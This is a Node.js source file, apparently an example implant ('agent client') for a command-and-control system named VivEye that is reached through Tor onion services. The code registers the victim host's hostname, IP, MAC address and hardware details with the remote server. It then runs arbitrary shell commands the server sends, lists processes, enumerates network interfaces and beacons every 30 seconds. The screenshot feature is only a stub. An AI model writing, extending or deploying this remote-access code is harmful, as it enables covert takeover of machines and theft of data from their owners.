#!/usr/bin/env node

/**
 * VivEye Agent Client Example
 * 
 * This is an example agent client that demonstrates how to connect
 * to the VivEye C&C system through Tor onion services.
 * 
 * Usage: node agent-client.js <beacon-id> <agent-id>
 */

const io = require('socket.io-client');
const os = require('os');
const { exec } = require('child_process');
const { promisify } = require('util');

const execAsync = promisify(exec);

class VivEyeAgent {
  constructor(beaconId, agentId, serverUrl) {
    this.beaconId = beaconId;
    this.agentId = agentId;
    this.serverUrl = serverUrl;
    this.socket = null;
    this.isConnected = false;
    this.capabilities = [
      'command_execution',
      'system_info',
      'screenshot',
      'network_scan',
      'process_list'
    ];
  }

  async connect() {
    try {
      console.log(`Connecting to VivEye server: ${this.serverUrl}`);
      
      this.socket = io(this.serverUrl, {
        transports: ['websocket', 'polling'],
        timeout: 60000,
        forceNew: true
      });

      this.socket.on('connect', () => {
        console.log('Connected to server');
        this.isConnected = true;
        this.register();
      });

      this.socket.on('disconnect', () => {
        console.log('Disconnected from server');
        this.isConnected = false;
      });

      this.socket.on('connect_error', (error) => {
        console.error('Connection error:', error.message);
      });

      this.socket.on('new-command', (command) => {
        this.handleCommand(command);
      });

      this.socket.on('cancel-command', (data) => {
        console.log(`Command ${data.commandId} cancelled`);
      });

    } catch (error) {
      console.error('Failed to connect:', error);
    }
  }

  register() {
    const systemInfo = this.getSystemInfo();
    
    this.socket.emit('agent-register', {
      agentId: this.agentId,
      beaconId: this.beaconId,
      systemInfo,
      capabilities: this.capabilities
    });

    console.log('Agent registered with server');
  }

  getSystemInfo() {
    return {
      os: os.platform(),
      version: os.release(),
      architecture: os.arch(),
      hostname: os.hostname(),
      ipAddress: this.getLocalIP(),
      macAddress: this.getMacAddress(),
      cpu: os.cpus()[0].model,
      memory: `${Math.round(os.totalmem() / 1024 / 1024 / 1024)}GB`,
      diskSpace: 'Unknown' // Would need additional library to get disk space
    };
  }

  getLocalIP() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
      for (const iface of interfaces[name]) {
        if (iface.family === 'IPv4' && !iface.internal) {
          return iface.address;
        }
      }
    }
    return '127.0.0.1';
  }

  getMacAddress() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
      for (const iface of interfaces[name]) {
        if (iface.family === 'IPv4' && !iface.internal) {
          return iface.mac;
        }
      }
    }
    return '00:00:00:00:00:00';
  }

  async handleCommand(command) {
    console.log(`Executing command: ${command.type}`);
    
    const startTime = Date.now();
    let result = {
      commandId: command.commandId,
      success: false,
      output: '',
      error: '',
      exitCode: 0,
      executionTime: 0,
      data: null
    };

    try {
      switch (command.type) {
        case 'execute_command':
          result = await this.executeCommand(command.command, result, startTime);
          break;
        case 'system_info':
          result = await this.getSystemInfoCommand(result, startTime);
          break;
        case 'screenshot':
          result = await this.takeScreenshot(result, startTime);
          break;
        case 'network_scan':
          result = await this.networkScan(result, startTime);
          break;
        case 'process_list':
          result = await this.getProcessList(result, startTime);
          break;
        default:
          result.error = `Unknown command type: ${command.type}`;
      }
    } catch (error) {
      result.success = false;
      result.error = error.message;
      result.executionTime = Date.now() - startTime;
    }

    this.socket.emit('command-result', result);
  }

  async executeCommand(command, result, startTime) {
    try {
      const { stdout, stderr } = await execAsync(command, { timeout: 30000 });
      result.success = true;
      result.output = stdout;
      result.error = stderr;
      result.exitCode = 0;
    } catch (error) {
      result.success = false;
      result.output = error.stdout || '';
      result.error = error.stderr || error.message;
      result.exitCode = error.code || 1;
    }
    
    result.executionTime = Date.now() - startTime;
    return result;
  }

  async getSystemInfoCommand(result, startTime) {
    try {
      const systemInfo = this.getSystemInfo();
      result.success = true;
      result.output = JSON.stringify(systemInfo, null, 2);
      result.data = systemInfo;
    } catch (error) {
      result.success = false;
      result.error = error.message;
    }
    
    result.executionTime = Date.now() - startTime;
    return result;
  }

  async takeScreenshot(result, startTime) {
    try {
      // This would require additional libraries like 'screenshot-desktop'
      // For this example, we'll simulate it
      result.success = true;
      result.output = 'Screenshot functionality not implemented in this example';
      result.data = { message: 'Screenshot would be taken here' };
    } catch (error) {
      result.success = false;
      result.error = error.message;
    }
    
    result.executionTime = Date.now() - startTime;
    return result;
  }

  async networkScan(result, startTime) {
    try {
      const interfaces = os.networkInterfaces();
      const networkInfo = {};
      
      for (const [name, ifaces] of Object.entries(interfaces)) {
        networkInfo[name] = ifaces.map(iface => ({
          address: iface.address,
          family: iface.family,
          internal: iface.internal,
          mac: iface.mac
        }));
      }
      
      result.success = true;
      result.output = JSON.stringify(networkInfo, null, 2);
      result.data = networkInfo;
    } catch (error) {
      result.success = false;
      result.error = error.message;
    }
    
    result.executionTime = Date.now() - startTime;
    return result;
  }

  async getProcessList(result, startTime) {
    try {
      const { stdout } = await execAsync('ps aux', { timeout: 10000 });
      const processes = stdout.split('\n').slice(1).map(line => {
        const parts = line.trim().split(/\s+/);
        return {
          user: parts[0],
          pid: parts[1],
          cpu: parts[2],
          mem: parts[3],
          command: parts.slice(10).join(' ')
        };
      }).filter(p => p.pid);
      
      result.success = true;
      result.output = JSON.stringify(processes, null, 2);
      result.data = processes;
    } catch (error) {
      result.success = false;
      result.error = error.message;
    }
    
    result.executionTime = Date.now() - startTime;
    return result;
  }

  startHeartbeat() {
    setInterval(() => {
      if (this.isConnected) {
        const performance = {
          cpuUsage: this.getCPUUsage(),
          memoryUsage: this.getMemoryUsage(),
          diskUsage: 0 // Would need additional library
        };
        
        this.socket.emit('heartbeat', { performance });
      }
    }, 30000); // Every 30 seconds
  }

  getCPUUsage() {
    // Simple CPU usage calculation
    const cpus = os.cpus();
    let totalIdle = 0;
    let totalTick = 0;
    
    cpus.forEach(cpu => {
      for (const type in cpu.times) {
        totalTick += cpu.times[type];
      }
      totalIdle += cpu.times.idle;
    });
    
    return Math.round(100 - (100 * totalIdle / totalTick));
  }

  getMemoryUsage() {
    const total = os.totalmem();
    const free = os.freemem();
    return Math.round(((total - free) / total) * 100);
  }

  disconnect() {
    if (this.socket) {
      this.socket.disconnect();
    }
  }
}

// Main execution
async function main() {
  const args = process.argv.slice(2);
  
  if (args.length < 2) {
    console.log('Usage: node agent-client.js <beacon-id> <agent-id> [server-url]');
    console.log('Example: node agent-client.js BEACON_123 AGENT_456 http://your-onion-address.onion');
    process.exit(1);
  }

  const beaconId = args[0];
  const agentId = args[1];
  const serverUrl = args[2] || 'http://localhost:5001'; // Default to local agent server

  console.log('VivEye Agent Client');
  console.log(`Beacon ID: ${beaconId}`);
  console.log(`Agent ID: ${agentId}`);
  console.log(`Server URL: ${serverUrl}`);

  const agent = new VivEyeAgent(beaconId, agentId, serverUrl);
  
  // Handle graceful shutdown
  process.on('SIGINT', () => {
    console.log('\nShutting down agent...');
    agent.disconnect();
    process.exit(0);
  });

  process.on('SIGTERM', () => {
    console.log('\nShutting down agent...');
    agent.disconnect();
    process.exit(0);
  });

  await agent.connect();
  agent.startHeartbeat();

  console.log('Agent is running. Press Ctrl+C to stop.');
}

if (require.main === module) {
  main().catch(console.error);
}

module.exports = VivEyeAgent;